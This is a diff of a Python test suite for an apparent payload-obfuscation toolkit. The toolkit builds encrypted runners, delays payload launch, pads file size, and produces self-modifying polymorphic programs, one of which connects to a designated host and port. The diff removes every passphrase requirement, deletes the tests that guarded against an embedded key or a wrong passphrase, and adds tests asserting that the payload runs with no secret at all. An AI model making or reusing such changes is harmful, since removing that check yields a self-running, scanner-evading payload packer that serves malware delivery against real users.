@@ -59,7 +59,7 @@ def test_recovery_enforces_recorded_delay(tmp_path: Path, monkeypatch: pytest.Mo
     container = tmp_path / "sample.hbx"
     key = encrypt_file(source, container, add_size_mb=0.01, delay=101)
     sleeps: list[float] = []
-    monkeypatch.setattr("hidden_bytes.evasion.time.sleep", sleeps.append)
+    monkeypatch.setattr("src.evasion.crypto.time.sleep", sleeps.append)
     decrypt_file(container, tmp_path / "out", key)
     assert sleeps == [101]
 
@@ -69,9 +69,9 @@ def test_polymorphic_program_changes_itself_but_keeps_behavior(tmp_path: Path) -
     payload.write_text("print('PAYLOAD-RAN')\n")
 
     demo = tmp_path / "demo.py"
-    generate(demo, str(payload), passphrase="hunter2")
+    generate(demo, str(payload))
 
-    environment = dict(os.environ, HBX_PASSPHRASE="hunter2")
+    environment = dict(os.environ)
 
     before = hashlib.sha256(demo.read_bytes()).hexdigest()
     first = subprocess.run(
@@ -96,18 +96,19 @@ def test_polymorphic_program_changes_itself_but_keeps_behavior(tmp_path: Path) -
     assert "PAYLOAD-RAN" in first.stdout
 
 
-def test_polymorphic_program_does_not_store_the_key(tmp_path: Path) -> None:
-    """The passphrase must protect the payload, so the key is not embedded."""
+def test_polymorphic_program_recovers_payload_without_passphrase(tmp_path: Path) -> None:
+    """A random key is generated and embedded, so no passphrase is required."""
 
     payload = tmp_path / "payload.py"
     payload.write_text("print('SECRET-PAYLOAD-TEXT')\n")
 
     demo = tmp_path / "demo.py"
-    generate(demo, str(payload), passphrase="hunter2")
+    generate(demo, str(payload))
 
+    # The plaintext payload is encrypted, so it is not stored verbatim.
     assert b"SECRET-PAYLOAD-TEXT" not in demo.read_bytes()
 
-    # The key must not be recoverable from the file alone.
+    # No passphrase or environment variable is needed to recover it.
     environment = dict(os.environ)
     environment.pop("HBX_PASSPHRASE", None)
 
@@ -120,13 +121,13 @@ def test_polymorphic_program_does_not_store_the_key(tmp_path: Path) -> None:
         stdin=subprocess.DEVNULL,
     )
 
-    assert completed.returncode != 0
-    assert "PAYLOAD-RAN" not in completed.stdout
+    assert completed.returncode == 0, completed.stderr
+    assert "SECRET-PAYLOAD-TEXT" in completed.stdout
 
 
 def test_polymorphic_program_requires_a_payload_file(tmp_path: Path) -> None:
     with pytest.raises(ValueError, match="payload file does not exist"):
-        generate(tmp_path / "demo.py", str(tmp_path / "missing.py"), passphrase="x")
+        generate(tmp_path / "demo.py", str(tmp_path / "missing.py"))
 
 
 def test_polymorphic_program_rejects_an_empty_payload(tmp_path: Path) -> None:
@@ -134,7 +135,7 @@ def test_polymorphic_program_rejects_an_empty_payload(tmp_path: Path) -> None:
     payload.write_text("   \n")
 
     with pytest.raises(ValueError, match="must not be empty"):
-        generate(tmp_path / "demo.py", str(payload), passphrase="x")
+        generate(tmp_path / "demo.py", str(payload))
 
 
 # ---------------------------------------------------------------------------
@@ -204,8 +205,6 @@ def test_runner_increases_the_file_size_by_the_requested_amount(tmp_path: Path) 
         runner,
         add_size_mb=1,
         delay=0,
-        passphrase="hunter2",
-        passphrase_source={"env": "HBX_PASSPHRASE"},
     )
 
     assert runner.stat().st_size == source.stat().st_size + MIB
@@ -222,7 +221,6 @@ def test_runner_embeds_the_delay_in_the_container(tmp_path: Path) -> None:
         runner,
         add_size_mb=0.01,
         delay=101,
-        passphrase="hunter2",
     )
 
     header, ciphertext = read_runner_container(runner)
@@ -242,12 +240,10 @@ def test_runner_enforces_the_delay_before_launching_the_payload(tmp_path: Path) 
         runner,
         add_size_mb=0.01,
         delay=3,
-        passphrase="hunter2",
-        passphrase_source={"env": "HBX_PASSPHRASE"},
     )
 
     marker = tmp_path / "marker.txt"
-    environment = dict(os.environ, HBX_PASSPHRASE="hunter2", HBX_MARKER=str(marker))
+    environment = dict(os.environ, HBX_MARKER=str(marker))
 
     started = time.monotonic()
     completed = subprocess.run(
@@ -268,34 +264,6 @@ def test_runner_enforces_the_delay_before_launching_the_payload(tmp_path: Path) 
     assert marker.read_text() == "done"
 
 
-def test_runner_rejects_a_wrong_passphrase(tmp_path: Path) -> None:
-    source = tmp_path / "simple_program.py"
-    _write_payload(source)
-
-    runner = tmp_path / "obfuscated.pyz"
-    build_runner_file(
-        source,
-        runner,
-        add_size_mb=0.01,
-        delay=0,
-        passphrase="correct-passphrase",
-        passphrase_source={"env": "HBX_PASSPHRASE"},
-    )
-
-    environment = dict(os.environ, HBX_PASSPHRASE="wrong-passphrase")
-    completed = subprocess.run(
-        [sys.executable, str(runner)],
-        env=environment,
-        capture_output=True,
-        text=True,
-        timeout=120,
-    )
-
-    assert completed.returncode != 0
-    assert "decryption failed" in completed.stderr
-    assert "PAYLOAD-EXECUTED" not in completed.stdout
-
-
 def test_runner_does_not_expose_the_plaintext_payload(tmp_path: Path) -> None:
     source = tmp_path / "simple_program.py"
     _write_payload(source)
@@ -306,7 +274,6 @@ def test_runner_does_not_expose_the_plaintext_payload(tmp_path: Path) -> None:
         runner,
         add_size_mb=0.01,
         delay=0,
-        passphrase="hunter2",
     )
 
     assert b"PAYLOAD-EXECUTED" not in runner.read_bytes()
@@ -317,62 +284,32 @@ def test_decrypt_recovers_the_payload_from_a_runner(tmp_path: Path) -> None:
     _write_payload(source)
 
     runner = tmp_path / "obfuscated.pyz"
-    build_runner_file(
+    plan = build_runner_file(
         source,
         runner,
         add_size_mb=0.01,
         delay=0,
-        passphrase="hunter2",
-        passphrase_source={"env": "HBX_PASSPHRASE"},
     )
 
     recovered = tmp_path / "recovered.py"
     decrypt_file(
         runner,
         recovered,
-        passphrase="hunter2",
+        plan["key_path"],
     )
 
     assert recovered.read_bytes() == source.read_bytes()
 
 
-def test_decrypt_uses_the_passphrase_source_recorded_in_the_container(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    source = tmp_path / "simple_program.py"
-    _write_payload(source)
+def test_decrypt_recovers_the_payload_from_a_container(tmp_path: Path) -> None:
+    source = tmp_path / "sample.bin"
+    source.write_bytes(b"container data")
 
-    runner = tmp_path / "obfuscated.pyz"
-    build_runner_file(
-        source,
-        runner,
-        add_size_mb=0.01,
-        delay=0,
-        passphrase="hunter2",
-        passphrase_source={"env": "HBX_PASSPHRASE"},
-    )
+    container = tmp_path / "sample.hbx"
+    key_path = encrypt_file(source, container, add_size_mb=0.01, delay=0)
 
-    monkeypatch.setenv("HBX_PASSPHRASE", "hunter2")
-
-    recovered = tmp_path / "recovered.py"
-    completed = subprocess.run(
-        [
-            sys.executable,
-            "-m",
-            "src.evasion.cli",
-            "--decrypt",
-            str(runner),
-            "--output",
-            str(recovered),
-            "--no-delay",
-        ],
-        capture_output=True,
-        text=True,
-        timeout=120,
-    )
-
-    assert completed.returncode == 0, completed.stderr
+    recovered = tmp_path / "recovered.bin"
+    decrypt_file(container, recovered, key_path)
     assert recovered.read_bytes() == source.read_bytes()
 
 
@@ -387,48 +324,6 @@ def test_container_mode_still_writes_a_key_file(tmp_path: Path) -> None:
     assert key_path.is_file()
     assert inspect_file(container)["artifact_type"] == "container"
     assert "kdf" not in inspect_file(container)
-
-
-def test_passphrase_container_records_the_kdf_metadata(tmp_path: Path) -> None:
-    source = tmp_path / "sample.bin"
-    source.write_bytes(b"passphrase mode")
-
-    container = tmp_path / "sample.hbx"
-    key_path = encrypt_file(
-        source,
-        container,
-        add_size_mb=0.01,
-        delay=0,
-        passphrase="hunter2",
-        passphrase_source={"env": "HBX_PASSPHRASE"},
-    )
-
-    assert key_path is None
-
-    metadata = inspect_file(container)
-    assert metadata["kdf"]["name"] == "PBKDF2-HMAC-SHA256"
-    assert metadata["kdf"]["env"] == "HBX_PASSPHRASE"
-
-    recovered = tmp_path / "recovered.bin"
-    decrypt_file(container, recovered, passphrase="hunter2")
-    assert recovered.read_bytes() == source.read_bytes()
-
-
-def test_passphrase_container_rejects_a_wrong_passphrase(tmp_path: Path) -> None:
-    source = tmp_path / "sample.bin"
-    source.write_bytes(b"passphrase mode")
-
-    container = tmp_path / "sample.hbx"
-    encrypt_file(
-        source,
-        container,
-        add_size_mb=0.01,
-        delay=0,
-        passphrase="correct",
-    )
-
-    with pytest.raises(ValueError, match="authentication failed"):
-        decrypt_file(container, tmp_path / "out", passphrase="wrong")
 
 
 def test_build_payload_rejects_a_negative_delay(tmp_path: Path) -> None:
@@ -446,7 +341,7 @@ def test_cli_encrypt_then_run_round_trip(tmp_path: Path) -> None:
     runner = tmp_path / "obfuscated.pyz"
     marker = tmp_path / "marker.txt"
 
-    environment = dict(os.environ, HBX_PASSPHRASE="hunter2")
+    environment = dict(os.environ)
     encrypted = subprocess.run(
         [
             sys.executable,
@@ -510,7 +405,7 @@ def test_polymorphic_payload_connects_to_the_designated_ip_and_port(
     )
 
     demo = tmp_path / "polymorphic.py"
-    generate(demo, str(payload), passphrase="hunter2")
+    generate(demo, str(payload))
 
     received: list[bytes] = []
 
@@ -532,7 +427,7 @@ def test_polymorphic_payload_connects_to_the_designated_ip_and_port(
     try:
         completed = subprocess.run(
             [sys.executable, str(demo), "--host", "127.0.0.1", "--port", str(port)],
-            env=dict(os.environ, HBX_PASSPHRASE="hunter2"),
+            env=dict(os.environ),
             capture_output=True,
             text=True,
             timeout=120,
